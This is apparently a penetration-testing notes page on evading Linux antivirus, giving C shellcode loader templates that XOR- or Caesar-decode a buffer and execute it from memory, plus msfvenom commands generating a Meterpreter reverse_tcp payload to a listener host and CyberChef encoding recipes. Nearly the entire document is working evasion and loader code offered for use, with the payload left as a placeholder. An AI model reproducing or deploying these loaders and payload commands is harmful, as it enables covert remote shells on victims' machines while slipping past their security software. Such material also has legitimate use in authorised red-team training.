---
description: Bypass Linux AV with C
---

# Linux Shellcode Encoders

## C Payloads&#x20;

When you're done building your payload make sure the processor architecture matches the target environment

```
gcc -o payload.out linux_payload.c -z execstack
```

### XOR Encoding

```
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

//sudo msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.0.1 LPORT=443 -f c --encrypt xor --encrypt-key R

unsigned char buf[] =<PAYLOAD>;


int main (int argc, char **argv) 
{
	char xor_key = 'R';
	int arraysize = (int) sizeof(buf);
	for (int i=0; i<arraysize-1; i++)
	{
		buf[i] = buf[i]^xor_key;
	}
	int (*ret)() = (int(*)())buf;
	ret();
}
```

### Ceasar Shift

Ceasar Shift Template

```
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

//sudo msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.0.1 LPORT=443 -f c
unsigned char buf[] = <PAYLOAD>;

int main (int argc, char **argv)
{
	int payload_length = ((int) sizeof(buf)) -1;
        printf("Ceasar Shift - 2");
        printf("\n");
        //unsigned char enc[payload_length];
	//unsigned char dec[payload_length];

	for (int i=0; i<payload_length; i++)
	{
	   //enc[i] = ((buf[i]-2)& 0xFF);
	   printf("\\x%02X",((buf[i]-2)& 0xFF));
	}
	
	/* THE FOLLOWING IS IF YOU WANTED TO TEST YOUR OWN ENCODING METHOD
	printf("\n");
        printf("Ceasar Shift Decoded");
        printf("\n");
        for (int i=0; i<payload_length; i++)
        {
	  dec[i] = ((enc[i]+2)& 0xFF);
          printf("\\x%02X",((enc[i]+2)& 0xFF));
        }
	printf("\n");
	if(memcmp(buf,dec,sizeof buf)==0)
	   printf("decode of shellcode is the same");
        printf("\n");
        */
	return 0;
	
}


```

```
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

unsigned char buf[] ="<COPY PAYLOAD FROM ENCODER ABOVE>";

int main (int argc, char **argv) 
{
        int arraysize = (int) sizeof(buf);
        for (int i=0; i<arraysize-1; i++)
        {
                buf[i] = ((buf[i]+2)& 0xff);
        }
        int (*ret)() = (int(*)())buf;
        ret();
}
```

### CyberChef Encoder Shortcut

Ceasar Shift Link

{% embed url="https://gchq.github.io/CyberChef#recipe=SUB(%7B'option':'Hex','string':'2'%7D/disabled)From_Hex('Auto')ROT13(false,false,false,2)SUB(%7B'option':'Hex','string':'2'%7D)ADD(%7B'option':'Hex','string':'2'%7D/disabled)AND(%7B'option':'Hex','string':'0xFF'%7D)To_Hex('0x%20with%20comma',0)" %}
Shift - 2 By Default
{% endembed %}

XOR Link

{% embed url="https://gchq.github.io/CyberChef#recipe=From_Hex('%5C%5Cx')XOR(%7B'option':'UTF8','string':'R'%7D,'Standard',false)To_Hex('%5C%5Cx',0)" %}
XOR "R" By Default
{% endembed %}

